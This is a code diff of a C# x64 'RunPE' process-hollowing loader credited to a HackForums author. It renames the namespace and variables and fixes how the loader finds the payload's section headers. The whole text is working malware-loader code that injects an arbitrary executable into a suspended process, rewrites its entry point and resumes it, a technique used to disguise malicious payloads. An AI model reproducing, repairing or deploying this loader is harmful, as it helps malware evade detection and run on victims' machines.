@@ -2,7 +2,7 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace HackForums.gigajew
+namespace _64l
 {
     /// <summary>
     /// Tiny x64 RunPE by gigajew
@@ -62,9 +62,10 @@ namespace HackForums.gigajew
             int e_lfanew = Marshal.ReadInt32(payloadBuffer, 0x3c);
             int sizeOfImage = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x038);
             int sizeOfHeaders = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x03c);
-            int ep = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x10);
+            int entryPoint = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x10);
 
-            short sec = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x2);
+            short numberOfSections = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x2);
+			short sizeOfOptionalHeader = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x10);
 
             long imageBase = Marshal.ReadInt64(payloadBuffer, e_lfanew + 0x18 + 0x18);
 
@@ -89,10 +90,10 @@ namespace HackForums.gigajew
             VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
             WriteProcessMemory(processHandle, imageBase, payloadBuffer, sizeOfHeaders, 0L);
 
-            for (short i = 0; i < sec; i++)
+            for (short i = 0; i < numberOfSections; i++)
             {
                 byte[] section = new byte[0x28];
-                Buffer.BlockCopy(payloadBuffer, e_lfanew + 0x108 + (0x28 * i), section, 0, 0x28);
+                Buffer.BlockCopy(payloadBuffer, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);
 
                 int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                 int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
@@ -111,7 +112,7 @@ namespace HackForums.gigajew
             long rdx = Marshal.ReadInt64(apThreadContext, 0x88);
             WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);
 
-            Marshal.WriteInt64(apThreadContext, 0x80 /* rcx */, imageBase + ep);
+            Marshal.WriteInt64(apThreadContext, 0x80 /* rcx */, imageBase + entryPoint);
 
             SetThreadContext(threadHandle, apThreadContext);
             ResumeThread(threadHandle);
